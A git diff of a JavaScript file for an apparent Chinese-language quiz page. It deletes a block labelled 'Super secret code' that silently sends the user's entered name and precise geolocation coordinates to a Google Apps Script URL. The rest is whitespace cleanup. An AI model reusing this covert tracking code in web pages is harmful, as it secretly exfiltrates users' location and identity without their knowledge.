@@ -80,20 +80,6 @@ const questions = {
         "空無一人的車。"],
 }
 
-// Super secret code
-const successCallback = (position) => {
-    fetch(`https://script.google.com/macros/s/AKfycbwZK-Ode5UnYWrfCn9bRi31-D64GgixunrFEDKEdvlu3sKANGeDfgnIFhtdeloeaDyQkw/exec?form=座標&data=["${document.getElementById("name").value}","${position.coords.latitude},${position.coords.longitude}"]`)
-};
-
-const errorCallback = (error) => {
-    console.log(error);
-};
-const options = {
-    enableHighAccuracy: true,
-    timeout: 20000,
-};
-
-
 const leftElement = document.getElementById("left");
 const start = () => {
 
@@ -190,7 +176,6 @@ const end = () => {
             document.getElementById("download-text").classList.add("small");
             const rangeInput = document.getElementById('rangeInput');
             const output = document.getElementById('output');
-    
             rangeInput.addEventListener('input', function() {
                 output.textContent = rangeInput.value;
             });
@@ -200,9 +185,7 @@ const end = () => {
         .catch(function (error) {
             alert("錯誤，請再試一次: " + error)
         });
-
 }
-
 const feedback = () => {
     var feedback = document.getElementById("feedback");
     feedback.innerText = "提交中";
